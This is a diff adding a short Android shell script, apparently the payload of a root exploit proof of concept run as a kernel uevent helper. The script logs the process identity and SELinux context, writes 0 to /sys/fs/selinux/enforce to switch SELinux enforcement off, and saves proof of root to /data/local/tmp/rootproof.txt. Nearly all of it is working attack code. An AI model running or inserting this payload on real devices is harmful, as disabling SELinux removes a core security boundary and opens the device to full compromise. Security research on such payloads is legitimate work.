@@ -1,0 +1,9 @@
+#!/system/bin/sh
+{
+  echo "== uevent helper ran =="
+  id
+  echo "cat: $(cat /proc/self/attr/current 2>&1)"
+  echo "enforce_before: $(cat /sys/fs/selinux/enforce 2>&1)"
+  echo 0 > /sys/fs/selinux/enforce 2>&1 && echo "setenforce0: ok"
+  echo "enforce_after: $(cat /sys/fs/selinux/enforce 2>&1)"
+} > /data/local/tmp/rootproof.txt 2>&1
